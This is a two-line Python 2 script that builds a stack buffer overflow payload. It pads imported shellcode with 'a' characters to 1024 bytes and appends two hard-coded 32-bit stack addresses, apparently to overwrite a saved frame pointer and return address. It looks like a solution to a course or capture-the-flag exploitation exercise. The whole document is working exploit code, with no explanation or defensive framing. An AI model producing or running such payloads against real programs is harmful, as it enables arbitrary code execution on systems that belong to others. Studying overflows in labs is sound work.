from shellcode import shellcode
print shellcode + 'a'*(1024 - len(shellcode)) + '\x98\xaa\xfe\xff' + '\xac\xae\xfe\xff'